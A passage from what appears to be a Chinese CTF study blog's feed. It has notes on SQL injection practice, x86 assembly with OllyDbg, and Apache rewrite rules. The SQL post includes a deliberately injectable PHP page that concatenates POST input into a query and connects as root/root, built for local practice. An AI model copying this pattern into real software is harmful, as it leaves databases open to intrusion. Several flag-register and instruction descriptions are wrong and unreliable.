alt></p><h1 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h1><p>统一资源定位符，提供资源（通常是文档）的路径或位置。结构如下：</p><pre><code>协议://授权/路径?查询</code></pre><h1 id="GET-请求和-POST-请求"><a href="#GET-请求和-POST-请求" class="headerlink" title="GET 请求和 POST 请求"></a>GET 请求和 POST 请求</h1><p>HTTP 中定义的客户端可以发送服务器的两种操作</p><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p>从服务器查询数据方式：用?分割 url 和查询的数据</p><h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p>向服务器传递数据方式：通过 form 表单传递</p><h1 id="PHP-与-MYSQL"><a href="#PHP-与-MYSQL" class="headerlink" title="PHP 与 MYSQL"></a>PHP 与 MYSQL</h1><h2 id="GET-方法传递参数"><a href="#GET-方法传递参数" class="headerlink" title="GET 方法传递参数"></a>GET 方法传递参数</h2><pre><code class="PHP">&lt;?php$id=$_GET[&#39;id&#39;];if(!is_numeric($id)){    echo &quot;U r a hacker!&lt;br&gt;&quot;;}else{    echo &quot;Connecting database!&lt;br&gt;&quot;;}?&gt;</code></pre><p>PS：<code>&lt;br&gt;</code>为换行符</p><h2 id="POST-方法传递参数"><a href="#POST-方法传递参数" class="headerlink" title="POST 方法传递参数"></a>POST 方法传递参数</h2><pre><code class="php">&lt;form action=&quot;test.php&quot; method=&quot;post&quot;&gt;Pls input ur id: &lt;input type=&quot;text&quot; name=&quot;id&quot; /&gt;&lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt;U r NO.&lt;?php echo $_POST[&#39;id&#39;]; ?&gt; visitor!</code></pre><h2 id="与-mysql-相关函数"><a href="#与-mysql-相关函数" class="headerlink" title="与 mysql 相关函数"></a>与 mysql 相关函数</h2><h3 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h3><pre><code>mysql_connect(servername, username, password);</code></pre><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">servername</td><td style="text-align:center">可选。规定要连接的服务器，默认是“localhost:3306”</td></tr><tr><td style="text-align:center">username</td><td style="text-align:center">可选。规定登陆所使用的用户名，默认是拥有服务器进程的用户名的名称</td></tr><tr><td style="text-align:center">password</td><td style="text-align:center">可选。规定登陆所用的密码，默认是“”</td></tr></tbody></table><h3 id="选取数据"><a href="#选取数据" class="headerlink" title="选取数据"></a>选取数据</h3><pre><code>mysql_query(query, connection);</code></pre><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">query</td><td style="text-align:center">必需。规定要发送的 sql 查询</td></tr><tr><td style="text-align:center">connection</td><td style="text-align:center">可选。规定 sql 连接标识符</td></tr></tbody></table><h3 id="设置活动的数据库"><a href="#设置活动的数据库" class="headerlink" title="设置活动的数据库"></a>设置活动的数据库</h3><pre><code>mysql_select_db(database, connection);</code></pre><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">database</td><td style="text-align:center">必需。规定要选择的数据库</td></tr><tr><td style="text-align:center">connection</td><td style="text-align:center">可选。规定 mysql 连接，如未指定，使用上一个连接</td></tr></tbody></table><h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><pre><code>mysql_fetch_array(data, array_type);</code></pre><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">data</td><td style="text-align:center">可选。规定要使用的数据指针</td></tr><tr><td style="text-align:center">array_type</td><td style="text-align:center">可选。规定返回结果</td></tr></tbody></table><h1 id="MYSQL-命令行指令"><a href="#MYSQL-命令行指令" class="headerlink" title="MYSQL 命令行指令"></a>MYSQL 命令行指令</h1><h2 id="更改密码"><a href="#更改密码" class="headerlink" title="更改密码"></a>更改密码</h2><pre><code class="sql">update mysql.user set password=password(&#39;test&#39;) where username=&#39;root&#39;;flush privileges;</code></pre><h2 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h2><pre><code class="sql">show databases;</code></pre><h2 id="选择数据库"><a href="#选择数据库" class="headerlink" title="选择数据库"></a>选择数据库</h2><pre><code class="sql">use mysql;</code></pre><h2 id="查看当前数据库所有数据表"><a href="#查看当前数据库所有数据表" class="headerlink" title="查看当前数据库所有数据表"></a>查看当前数据库所有数据表</h2><pre><code class="sql">show tables;</code></pre><h2 id="查看某张表所有字段信息"><a href="#查看某张表所有字段信息" class="headerlink" title="查看某张表所有字段信息"></a>查看某张表所有字段信息</h2><pre><code class="sql">desc users;</code></pre><h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><pre><code class="sql">create database mysql;</code></pre><h2 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h2><pre><code class="sql">drop database mysql;</code></pre><h2 id="创建表名为-users-的数据表（其中-id-为主键自增）"><a href="#创建表名为-users-的数据表（其中-id-为主键自增）" class="headerlink" title="创建表名为 users 的数据表（其中 id 为主键自增）"></a>创建表名为 users 的数据表（其中 id 为主键自增）</h2><pre><code class="sql">create table users(    id int auto_increment,    username varchar(20),    password varchar(50),    primary key (`id`));</code></pre><h2 id="修改表名"><a href="#修改表名" class="headerlink" title="修改表名"></a>修改表名</h2><pre><code class="sql">alter table users rename to users2;</code></pre><h2 id="往表中插入数据"><a href="#往表中插入数据" class="headerlink" title="往表中插入数据"></a>往表中插入数据</h2><pre><code class="sql">insert into users(...) value(...);</code></pre><h2 id="查询表中字段的数据类型"><a href="#查询表中字段的数据类型" class="headerlink" title="查询表中字段的数据类型"></a>查询表中字段的数据类型</h2><pre><code class="sql">show create table mysql;</code></pre><h1 id="MYSQL-相关命令及注释"><a href="#MYSQL-相关命令及注释" class="headerlink" title="MYSQL 相关命令及注释"></a>MYSQL 相关命令及注释</h1><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><blockquote><ul><li>AND：所有由 AND 连接的条件都为 TRUE，SQL 语句才执行</li><li>OR：只要 OR 连接的条件里有一个是 TRUE，SQL 语句就会执行</li><li>UNION SELECT：联合查询</li><li>GROUP BY：表示按照第几列进行排序</li><li>GROUP_CONCAT：将查询结果以一行的形式输出</li></ul></blockquote><h2 id="注释-1"><a href="#注释-1" class="headerlink" title="注释"></a>注释</h2><pre><code class="sql">-- 单行注释# 单行注释/*多行注释*/</code></pre><h1 id="SQL-手注练习"><a href="#SQL-手注练习" class="headerlink" title="SQL 手注练习"></a>SQL 手注练习</h1><p><img src="/pics/WEB集训/一/3.png" srcset="/img/loading.gif" alt></p><h2 id="判断有无注入点"><a href="#判断有无注入点" class="headerlink" title="判断有无注入点"></a>判断有无注入点</h2><p><img src="/pics/WEB集训/一/4.png" srcset="/img/loading.gif" alt></p><h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2><p><img src="/pics/WEB集训/一/5.png" srcset="/img/loading.gif" alt></p><h2 id="判断表中字段数"><a href="#判断表中字段数" class="headerlink" title="判断表中字段数"></a>判断表中字段数</h2><p><img src="/pics/WEB集训/一/6.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/WEB集训/一/7.png" srcset="/img/loading.gif" alt></p><h2 id="UNION-查询库名"><a href="#UNION-查询库名" class="headerlink" title="UNION 查询库名"></a>UNION 查询库名</h2><p><img src="/pics/WEB集训/一/8.png" srcset="/img/loading.gif" alt></p><h2 id="UNION-查询表名"><a href="#UNION-查询表名" class="headerlink" title="UNION 查询表名"></a>UNION 查询表名</h2><p><img src="/pics/WEB集训/一/9.png" srcset="/img/loading.gif" alt></p><h2 id="UNION-查询字段名"><a href="#UNION-查询字段名" class="headerlink" title="UNION 查询字段名"></a>UNION 查询字段名</h2><p><img src="/pics/WEB集训/一/10.png" srcset="/img/loading.gif" alt></p><h2 id="UNION-查询内容（得到-flag）"><a href="#UNION-查询内容（得到-flag）" class="headerlink" title="UNION 查询内容（得到 flag）"></a>UNION 查询内容（得到 flag）</h2><p><img src="/pics/WEB集训/一/11.png" srcset="/img/loading.gif" alt></p><h1 id="自己搭建一个-POST-方式的字符型-SQL-注入网站"><a href="#自己搭建一个-POST-方式的字符型-SQL-注入网站" class="headerlink" title="自己搭建一个 POST 方式的字符型 SQL 注入网站"></a>自己搭建一个 POST 方式的字符型 SQL 注入网站</h1><p>本地数据库如下：</p><p><img src="/pics/WEB集训/一/12.png" srcset="/img/loading.gif" alt></p><p>源码如下：</p><pre><code class="php">&lt;?PHP$id = $_POST[&#39;id&#39;];$conn = mysql_connect(&#39;127.0.0.1&#39;, &#39;root&#39;, &#39;root&#39;);if($conn){    echo &quot;Connected success!&lt;br&gt;&quot;;}else{    echo &quot;Connected fail!&lt;br&gt;&quot;;}$db_selected = mysql_select_db(&#39;qf&#39;, $conn);$sql = &quot;select * from test1 where id=&#39;$id&#39;&quot;;$res = mysql_query($sql, $conn);while($row = mysql_fetch_array($res)){    echo &quot;username: &quot;.$row[&#39;username&#39;].&quot;&lt;br&gt;&quot;;    echo &quot;age: &quot;.$row[&#39;age&#39;].&quot;&lt;br&gt;&quot;;    echo &quot;sex: &quot;.$row[&#39;sex&#39;].&quot;&lt;br&gt;&quot;;}mysql_close($conn);echo &quot;ur sql is:&quot;;echo &quot;select * from test1 where id=&#39;$id&#39;&quot;;?&gt;</code></pre><pre><code class="html">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;  Pls input ur id: &lt;input type=&quot;text&quot; name=&quot;id&quot; /&gt;&lt;br /&gt;  &lt;input type=&quot;submit&quot; name=&quot;&quot; , value=&quot;submit&quot; /&gt;&lt;/form&gt;</code></pre><p>以下为在本地注入时的过程，与 get 方式的注入过程没有什么差别，所以省去了判断的过程，直接注入</p><h2 id="查询库名"><a href="#查询库名" class="headerlink" title="查询库名"></a>查询库名</h2><p><img src="/pics/WEB集训/一/13.png" srcset="/img/loading.gif" alt></p><h2 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h2><p><img src="/pics/WEB集训/一/14.png" srcset="/img/loading.gif" alt></p><h2 id="查询字段名"><a href="#查询字段名" class="headerlink" title="查询字段名"></a>查询字段名</h2><p><img src="/pics/WEB集训/一/15.png" srcset="/img/loading.gif" alt></p><h2 id="查询内容（得到-flag）"><a href="#查询内容（得到-flag）" class="headerlink" title="查询内容（得到 flag）"></a>查询内容（得到 flag）</h2><p><img src="/pics/WEB集训/一/16.png" srcset="/img/loading.gif" alt></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RE入门（一）</title>
    <link href="/2018/07/01/RE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2018/07/01/RE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>基础汇编知识以及 OD 的使用。</p><a id="more"></a><h1 id="数值表示"><a href="#数值表示" class="headerlink" title="数值表示"></a>数值表示</h1><p>二进制-b（binary）、十进制-d（decimalism）、十六进制-h（hexadecimal）</p><p>字长：</p><ul><li>bit：位</li><li>byte：字节–1byte=8bit</li><li>word：字–1word=2byte=16bit</li><li>dword：双字–1dword=2word=4byte=32bit</li><li>qword：四字–1qword=2dword=4word=8byte=64bit</li></ul><h1 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h1><ul><li>EAX：累加器（accumulator），是加法乘法指令的缺省寄存器。还可以用来存储函数返回值</li><li>ECX：重复 REP 和 LOOP 指令的计数器（counter）</li><li><strong>EDX</strong>：用于存放整数除法产生的余数</li><li>EBX：在内存寻址时用来存放基地址（base）</li><li>ESP：当前线程的栈顶指针，压入栈的数据越多，ESP 越小，每入栈一次减小 4 字节</li><li>EBP：当前线程的栈底指针</li><li>ESI/EDI：源/目标索引寄存器，字符串操作中，DS:ESI 指向源串，ES:EDI 指向目标串。</li><li>EIP：存放下一个 CPU 指令的内存地址，执行完后读取下一指令</li></ul><h1 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h1><ul><li>CF：进位标志（可检查无符号操作是否溢出）</li><li>OF：零标志</li><li>SF：符号标志</li><li>PF：溢出标志（补码溢出）</li></ul><h1 id="寄存器寻址"><a href="#寄存器寻址" class="headerlink" title="寄存器寻址"></a>寄存器寻址</h1><ul><li>立即数寻址：<code>MOV EAX, 123H</code></li><li>寄存器寻址：<code>MOV EAX, EBX</code>（EBX 中存放操作数）</li><li>直接寻址：<code>MOV EAX, [12345678H]</code>（操作数以 <code>[]</code> 为地址）</li><li>寄存器间接寻址：<code>MOV EAX, [EBX]</code>（操作数的地址为 EBX 中存储的值）</li></ul><h1 id="基本汇编指令"><a href="#基本汇编指令" class="headerlink" title="基本汇编指令"></a>基本汇编指令</h1><h2 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h2><table><thead><tr><th style="text-align:center">指令</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">MOV</td><td style="text-align:center">赋值</td></tr><tr><td style="text-align:center">PUSH</td><td style="text-align:center">入栈</td></tr><tr><td style="text-align:center">POP</td><td style="text-align:center">出栈</td></tr><tr><td style="text-align:center">LEA</td><td style="text-align:center">取地址</td></tr><tr><td style="text-align:center"><strong>MOVSX</strong></td><td style="text-align:center">符号传送</td></tr><tr><td style="text-align:center"><strong>PUSHAD</strong></td><td style="text-align:center">将所有 32 位通用寄存器压入栈</td></tr><tr><td style="text-align:center"><strong>POPAD</strong></td><td style="text-align:center">将所有 32 位通用寄存器取出栈</td></tr></tbody></table><h2 id="算术运算"><a href="#算术运算" class="headerlink" title="算术运算"></a><strong>算术运算</strong></h2><table><thead><tr><th style="text-align:center">指令</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">ADD</td><td style="text-align:center">加法</td></tr><tr><td style="text-align:center">INC</td><td style="text-align:center">自加</td></tr><tr><td style="text-align:center">SUB</td><td style="text-align:center">减法</td></tr><tr><td style="text-align:center">DEC</td><td style="text-align:center">自减</td></tr><tr><td style="text-align:center">CMP</td><td style="text-align:center">比较</td></tr><tr><td style="text-align:center">MUL</td><td style="text-align:center">乘法</td></tr><tr><td style="text-align:center">DIV</td><td style="text-align:center">除法</td></tr><tr><td style="text-align:center"><strong>IDIV</strong></td><td style="text-align:center">符号整除</td></tr><tr><td style="text-align:center"><strong>IMUL</strong></td><td style="text-align:center">符号乘法</td></tr><tr><td style="text-align:center"><strong>NEG</strong></td><td style="text-align:center">求补</td></tr></tbody></table><h2 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h2><table><thead><tr><th style="text-align:center">指令</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">AND</td><td style="text-align:center">与运算</td></tr><tr><td style="text-align:center">OR</td><td style="text-align:center">或运算</td></tr><tr><td style="text-align:center">NOT</td><td style="text-align:center">非运算</td></tr><tr><td style="text-align:center">XOR</td><td style="text-align:center">异或运算</td></tr><tr><td style="text-align:center">TEST</td><td style="text-align:center">与运算（只对标志位修改，对操作数没有影响）</td></tr><tr><td style="text-align:center"><strong>SHL</strong></td><td style="text-align:center">逻辑左移</td></tr><tr><td style="text-align:center"><strong>SAL</strong></td><td style="text-align:center">算术左移</td></tr><tr><td style="text-align:center"><strong>SHR</strong></td><td style="text-align:center">逻辑右移</td></tr><tr><td style="text-align:center"><strong>SAR</strong></td><td style="text-align:center">算术右移</td></tr><tr><td style="text-align:center"><strong>ROL</strong></td><td style="text-align:center">循环左移</td></tr><tr><td style="text-align:center"><strong>ROR</strong></td><td style="text-align:center">循环右移</td></tr><tr><td style="text-align:center"><strong>RCL</strong></td><td style="text-align:center">进位循环左移</td></tr><tr><td style="text-align:center"><strong>RCR</strong></td><td style="text-align:center">进位循环右移</td></tr></tbody></table><h2 id="转移指令"><a href="#转移指令" class="headerlink" title="转移指令"></a>转移指令</h2><table><thead><tr><th style="text-align:center">指令</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">JMP</td><td style="text-align:center">跳转</td></tr><tr><td style="text-align:center">JA</td><td style="text-align:center">大于时跳转（&gt;）</td></tr><tr><td style="text-align:center">JNA</td><td style="text-align:center">不大于时跳转（&lt;=）</td></tr><tr><td style="text-align:center">JAE</td><td style="text-align:center">大于等于时跳转（&gt;=）</td></tr><tr><td style="text-align:center">JB</td><td style="text-align:center">小于时跳转（&lt;）</td></tr><tr><td style="text-align:center">JNB</td><td style="text-align:center">不小于时跳转（&gt;=）</td></tr><tr><td style="text-align:center">JBE</td><td style="text-align:center">小于等于时跳转（&lt;=）</td></tr><tr><td style="text-align:center">JE</td><td style="text-align:center">相等时跳转（==）</td></tr><tr><td style="text-align:center">JNE</td><td style="text-align:center">不等于时跳转（!=）</td></tr><tr><td style="text-align:center">JNBE</td><td style="text-align:center">不小于等于时跳转（&gt;）</td></tr><tr><td style="text-align:center">JG</td><td style="text-align:center">大于时跳转（有符号）（&gt;）</td></tr><tr><td style="text-align:center">JNG</td><td style="text-align:center">不大于时跳转（有符号）（&lt;=）</td></tr><tr><td style="text-align:center">JGE</td><td style="text-align:center">大于等于时跳转（有符号）（&gt;=）</td></tr><tr><td style="text-align:center">JL</td><td style="text-align:center">小于时跳转（有符号）（&lt;）</td></tr><tr><td style="text-align:center">JNL</td><td style="text-align:center">不小于时跳转（有符号）（&gt;=）</td></tr><tr><td style="text-align:center">JLE</td><td style="text-align:center">小于等于时跳转（有符号）（&lt;=）</td></tr><tr><td style="text-align:center">JNGE</td><td style="text-align:center">不大于等于时跳转（有符号）（&lt;）</td></tr><tr><td style="text-align:center">JNLE</td><td style="text-align:center">不小于等于时跳转（有符号）（&gt;）</td></tr><tr><td style="text-align:center">JZ</td><td style="text-align:center">ZF 为 0 时跳转</td></tr><tr><td style="text-align:center">JNZ</td><td style="text-align:center">ZF 不为 0 时跳转</td></tr><tr><td style="text-align:center">JS</td><td style="text-align:center">有符号时跳转</td></tr><tr><td style="text-align:center">JNS</td><td style="text-align:center">无符号时跳转</td></tr></tbody></table><p>JGE：Jump if Greater or Equal</p><h2 id="循环指令"><a href="#循环指令" class="headerlink" title="循环指令"></a>循环指令</h2><table><thead><tr><th style="text-align:center">指令</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">LOOP</td><td style="text-align:center">循环（改变 ECX 的值）</td></tr><tr><td style="text-align:center"><strong>JCXZ</strong></td><td style="text-align:center">循环（不改变 ECX 的值）</td></tr></tbody></table><h2 id="串指令"><a href="#串指令" class="headerlink" title="串指令"></a>串指令</h2><table><thead><tr><th style="text-align:center">指令</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center"><strong>MOVS[B/W/D]</strong></td><td style="text-align:center">传送字节串/字串/双字串</td></tr><tr><td style="text-align:center"><strong>CMPS[B/W/D]</strong></td><td style="text-align:center">比较字节串/字串/双字串</td></tr><tr><td style="text-align:center"><strong>SCAS[B/W/D]</strong></td><td style="text-align:center">扫描字节串/字串/双字串</td></tr><tr><td style="text-align:center"><strong>LODS[B/W/D]</strong></td><td style="text-align:center">加载源变址字节串/字串/双字串</td></tr><tr><td style="text-align:center"><strong>STOS[B/W/D]</strong></td><td style="text-align:center">保存字节串/字串/双字串</td></tr><tr><td style="text-align:center"><strong>REP</strong></td><td style="text-align:center">重复</td></tr></tbody></table><h2 id="其他指令"><a href="#其他指令" class="headerlink" title="其他指令"></a>其他指令</h2><table><thead><tr><th style="text-align:center">指令</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">INT</td><td style="text-align:center">终止程序</td></tr><tr><td style="text-align:center">CALL</td><td style="text-align:center">调用函数</td></tr><tr><td style="text-align:center"><strong>RET</strong></td><td style="text-align:center">过程返回</td></tr><tr><td style="text-align:center"><strong>NOP</strong></td><td style="text-align:center">空</td></tr><tr><td style="text-align:center"><strong>CLD</strong></td><td style="text-align:center">方向清零</td></tr></tbody></table><h1 id="OD-初探"><a href="#OD-初探" class="headerlink" title="OD 初探"></a>OD 初探</h1><p>静态调试与动态调试：<br>静态调试就是在不执行程序的情况下，人工地对源代码的语法和逻辑分析；动态调试则是在编译、链接、运行的整个过程中，观察如寄存器内容、函数执行情况等状态来分析调试</p><ul><li>L(og):日志信息</li><li>E(xecute modules):模块信息</li><li>M(emory map):内存映射信息</li><li>T(hreads):线程信息</li><li>W(indows):窗口信息</li><li>H(andles):句柄信息</li><li>C:当前线程上下文</li><li>K:调用链信息</li><li>……</li></ul><h1 id="OD-调试快捷键"><a href="#OD-调试快捷键" class="headerlink" title="OD 调试快捷键"></a>OD 调试快捷键</h1><table><thead><tr><th style="text-align:center">快捷键</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">ctrl+g</td><td style="text-align:center">跳转到指定位置</td></tr><tr><td style="text-align:center">ctrl+e</td><td style="text-align:center">编辑指定区域</td></tr><tr><td style="text-align:center">space</td><td style="text-align:center">编辑汇编代码</td></tr><tr><td style="text-align:center">f4</td><td style="text-align:center">执行到光标位置处</td></tr><tr><td style="text-align:center">f2</td><td style="text-align:center">断点（Int3）</td></tr><tr><td style="text-align:center">;</td><td style="text-align:center">添加注释</td></tr><tr><td style="text-align:center">:</td><td style="text-align:center">添加标签名</td></tr><tr><td style="text-align:center">*</td><td style="text-align:center">返回到正在运行的地方</td></tr><tr><td style="text-align:center">-(+)</td><td style="text-align:center">返回到上（下）一个光标处</td></tr><tr><td style="text-align:center">enter</td><td style="text-align:center">跟随跳转/跟入调用内部</td></tr><tr><td style="text-align:center">f3</td><td style="text-align:center">打开一个新的可执行程序</td></tr><tr><td style="text-align:center">ctrl+f2</td><td style="text-align:center">重新运行当前调试的程序</td></tr><tr><td style="text-align:center">f9</td><td style="text-align:center">运行选定的程序进行调试</td></tr><tr><td style="text-align:center">f12</td><td style="text-align:center">暂时停止被调试程序的执行</td></tr><tr><td style="text-align:center">f7</td><td style="text-align:center">单步进入被调试程序的 call 中</td></tr><tr><td style="text-align:center">f8</td><td style="text-align:center">步过被调试程序的 call</td></tr><tr><td style="text-align:center">ctrl+f9</td><td style="text-align:center">执行直到返回</td></tr></tbody></table><h1 id="第一次调试（helloworld-exe）"><a href="#第一次调试（helloworld-exe）" class="headerlink" title="第一次调试（helloworld.exe）"></a>第一次调试（helloworld.exe）</h1><p>关于 PE 文件的 EntryPoint。打开 CFF，将 PE 文件拖入：</p><p><img src="/pics/BIN集训/RE/一/1.png" srcset="/img/loading.gif" alt></p><p>其中，ImageBase 和 AddressOfEntryPoint 指向的地址即为 EntryPoint</p><h2 id="找到-main-函数"><a href="#找到-main-函数" class="headerlink" title="找到 main 函数"></a>找到 main 函数</h2><ul><li>代码执行：通过 F7 单步步入，一步一步执行到弹框跳出时，进入 main 函数</li><li>层层推进：通过 F8 单步步过，快速跳过每个函数，跳出弹框后，进入 main 函数</li><li>字符串检索：根据弹框上方的字符串，右键智能搜索查找，找到后直接进入 main 函数</li><li>API 检索法：通过运行程序可以判断文件句柄是 MessageBox，在模块中找到后依次设置断点，运行程序，在主函数断电处停下</li><li>特征法：根据 C 语言的反汇编特征进行判断</li></ul><h2 id="修改内容"><a href="#修改内容" class="headerlink" title="修改内容"></a>修改内容</h2><p><img src="/pics/BIN集训/RE/一/2.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/BIN集训/RE/一/3.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/BIN集训/RE/一/4.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/BIN集训/RE/一/5.png" srcset="/img/loading.gif" alt></p><h1 id="Fact-exe"><a href="#Fact-exe" class="headerlink" title="Fact.exe"></a>Fact.exe</h1><p><img src="/pics/BIN集训/RE/一/6.png" srcset="/img/loading.gif" alt></p><p>jge 表示大于或等于时跳转。当输入数字 n 时，EDX 存放值 n，ECX 中的值初始化为 1，<code>[local.3]</code> 中的值也为 1，每次循环时，ECX 中的值自加一，<code>[local.3]</code> 的值为自身再乘上 ECX 中的值。当 ECX 等于 EDX 时跳出循环，而不再进行下一次乘法，最后 <code>[local.3]</code> 中的值为(n-1)!，故应该将 jge 修改为 jg 即可</p><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://www.cnblogs.com/qq78292959/archive/2012/07/20/2600865.html" target="_blank" rel="noopener">https://www.cnblogs.com/qq78292959/archive/2012/07/20/2600865.html</a><br><a href="https://blog.csdn.net/qq_34717555/article/details/77727176" target="_blank" rel="noopener">https://blog.csdn.net/qq_34717555/article/details/77727176</a><br><a href="https://blog.csdn.net/hanchaoman/article/details/9187093" target="_blank" rel="noopener">https://blog.csdn.net/hanchaoman/article/details/9187093</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apache Rewrite（路由重写）</title>
    <link href="/2018/05/16/Apache-Rewrite%EF%BC%88%E8%B7%AF%E7%94%B1%E9%87%8D%E5%86%99%EF%BC%89/"/>
    <url>/2018/05/16/Apache-Rewrite%EF%BC%88%E8%B7%AF%E7%94%B1%E9%87%8D%E5%86%99%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>Apache Rewrite 能够实现 URL 的跳转和隐藏真实地址。它基于 Perl 语言的正则表达式规范。平时帮助我们实现拟静态，拟目录，域名跳转，防止盗链等。</p><a id="more"></a><h1 id="理解-Apache-Rewrite-的三个核心"><a href="#理解-Apache-Rewrite-的三个核心" class="headerlink" title="理解 Apache Rewrite 的三个核心"></a>理解 Apache Rewrite 的三个核心</h1><h2 id="RewriteEngine"><a href="#RewriteEngine" class="headerlink" title="RewriteEngine"></a>RewriteEngine</h2><p>这个是 rewrite 功能的总开关，用来开启是否启动 url rewrite。</p><pre><code>RewriteEngine on</code></pre><h2 id="RewriteCond"><a href="#RewriteCond" class="headerlink" title="RewriteCond"></a>RewriteCond</h2><p>RewriteCond 就是一个过滤条件，简单来说，当 URL 满足 RewriteCond 配置的条件的情况，就会执行 RewriteCond 下面紧邻的 RewriteRule 语句。</p><p>RewriteCond 和 RewriteRule 是上下对应的关系。可以有 1 个或者好几个 RewriteCond 来匹配一个 RewriteRule。</p><p><code>RewriteCond %{待测试项目} 正则表达式条件</code>。</p><pre><code>RewriteEngine onRewriteCond  %{HTTP_USER_AGENT}  ^Mozilla//5/.0.*RewriteRule  index.php            index.m.php</code></pre><p>如果设置上面的匹配规则，到来的 http 请求中的 <code>HTTP_USER_AGENT</code> 匹配 <code>^Mozilla//5/.0.*</code> 正则表达式的话，则执行下面的 RewriteRule，也就是说访问路径会跳转到 <code>index.m.php</code> 这个文件。</p><h2 id="RewriteRule"><a href="#RewriteRule" class="headerlink" title="RewriteRule"></a>RewriteRule</h2><pre><code>RewriteRule Pattern Substitution [flags]</code></pre><p>Pattern 是一个正则匹配。Substitution 是匹配的替换 <code>[flags]</code> 是一些参数限制。</p><pre><code>RewriteRule ^room/video/(\d+)\.html web/index\.php?c=room&amp;a=video&amp;r=$1 [QSA,NC,L]</code></pre><p>意思是 以 room 开头的 <code>room/video/123.html</code> 这样子，变成 <code>web/index.php?c=room&amp;a=video&amp;r=123</code>。</p><pre><code>RewriteRule \.(jpg|gif) http://image.baidu.com/ [R,NC,L]</code></pre><p>意思是以为是访问 <code>.jpg</code> 或者 <code>.gif</code> 的文件，都会调整到 <code>http://image.baidu.com</code>。</p><h1 id="重写规则的作用范围"><a href="#重写规则的作用范围" class="headerlink" title="重写规则的作用范围"></a>重写规则的作用范围</h1><ol><li><p>可以使用在 Apache 主配置文件 <code>httpd.conf</code> 中。</p></li><li><p>可以使用在 <code>httpd.conf</code> 里定义的虚拟主机配置中。</p></li><li><p>可以使用在基本目录的跨越配置文件 <code>.htaccess</code> 中。</p></li></ol><p>这三种方式，都需要在写规则前，用“<code>RewriteEngine on</code>”指令来打开 rewrite 功能。</p><h1 id="Apache-Rewrite-规则修正符"><a href="#Apache-Rewrite-规则修正符" class="headerlink" title="Apache Rewrite 规则修正符"></a>Apache Rewrite 规则修正符</h1><ul><li><code>R[=code](force redirect)</code>：强制外部重定向，强制在替代字符串加上 <code>http://thishost[:thisport]/</code> 前缀重定向到外部的 URL。如果 code 不指定，将用缺省的 302 HTTP 状态码。</li><li><code>F(force URL to be forbidden)</code>：禁用 URL，返回 403HTTP 状态码。</li><li><code>G(force URL to be gone)</code>：强制 URL 为 GONE，返回 410HTTP 状态码。</li><li><code>P(force proxy)</code>：强制使用代理转发。</li><li><code>L(last rule)</code>：表明当前规则是最后一条规则，停止分析以后规则的重写。</li><li><code>N(next round)</code>：重新从第一条规则开始运行重写过程。</li><li><code>C(chained with next rule)</code>：与下一条规则关联</li></ul><p>如果规则匹配则正常处理，该标志无效，如果不匹配，那么下面所有关联的规则都跳过。</p><ul><li><code>T=MIME-type(force MIME type)</code>：强制 MIME 类型。</li><li><code>NS(used only if no internal sub-request)</code>：只用于不是内部子请求。</li><li><code>NC(no case)</code>：不区分大小写。</li><li><code>QSA(query string append)</code>：追加请求字符串。</li><li><code>NE(no URI escaping of output)</code>：不在输出转义特殊字符。</li></ul><p>例如：</p><pre><code>RewriteRule /foo/(.*) /bar?arg=P1%3d$1 [R,NE] #将能正确的将/foo/zoo转换成/bar?arg=P1=zoo</code></pre><ul><li><code>PT(pass through to next handler)</code>：传递给下一个处理。</li></ul><p>例如：</p><pre><code>RewriteRule ^/abc(.*) /def$1 [PT] # 